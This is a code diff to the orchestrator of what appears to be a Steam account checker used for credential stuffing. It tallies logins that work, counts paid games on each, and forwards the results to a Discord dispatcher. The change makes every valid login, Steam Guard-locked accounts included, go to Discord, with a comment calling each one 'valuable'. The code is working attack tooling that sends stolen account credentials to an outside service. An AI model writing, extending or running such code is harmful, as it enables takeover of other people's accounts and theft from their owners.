@@ -679,7 +679,7 @@ class HeadlessOrchestrator:
                 if is_target:
                     result["matched_targets"] = matched_targets
 
-                # Outcomes
+                # ── Outcomes ──────────────────────────────────────────────────
                 if status == "HIT":
                     self.hit_count += 1
                     self.exporter.record_item_live(result)
@@ -689,31 +689,35 @@ class HeadlessOrchestrator:
                         matched_names = ", ".join([tg.get("name", "") for tg in matched_targets[:3]])
                         if len(matched_targets) > 3:
                             matched_names += f" +{len(matched_targets)-3} more"
-                        print(f"\n\033[1;32m[🎯 TARGET HIT] {username} | Matched: [{matched_names}] | Paid Games: {result.get('paid_games', 0)}\033[0m")
+                        print(f"\n\033[1;32m[TARGET HIT] {username} | Matched: [{matched_names}] | Paid: {result.get('paid_games', 0)}\033[0m")
                         self.exporter.record_target_hit(result, matched_targets)
-                        if self.dispatcher:
-                            await self.dispatcher.dispatch_hit(result)
                     else:
-                        print(f"\n\033[1;34m[PAID HIT] {username} | Paid Games: {result.get('paid_games', 0)} (Dispatched to Discord)\033[0m")
-                        if self.dispatcher and result.get("paid_games", 0) > 0:
-                            await self.dispatcher.dispatch_hit(result)
+                        print(f"\n\033[1;34m[HIT] {username} | Paid Games: {result.get('paid_games', 0)}\033[0m")
 
+                    # Send ALL hits to Discord — every valid login is valuable
+                    if self.dispatcher:
+                        await self.dispatcher.dispatch_hit(result)
 
                 elif status == "2FA_HIT":
                     self.two_fa_count += 1
-                    print(f"\n\033[1;33m[2FA GUARDED] {username} | Steam Guard Locked (Skipped from Discord)\033[0m")
+                    print(f"\n\033[1;33m[2FA] {username} | Steam Guard Locked | Games: {result.get('total_games', 0)}\033[0m")
                     self.exporter.record_item_live(result)
+                    # Send 2FA hits to Discord too — account is valid, just Steam Guard locked
+                    if self.dispatcher:
+                        await self.dispatcher.dispatch_hit(result)
 
                 elif status == "INVALID":
                     self.invalid_count += 1
                 else:
                     self.error_count += 1
+                # ─────────────────────────────────────────────────────────────
 
                 # Checkpoint save
                 if self.checked_count % 50 == 0:
                     self._save_checkpoint()
 
                 queue.task_done()
+
 
 
 def main():
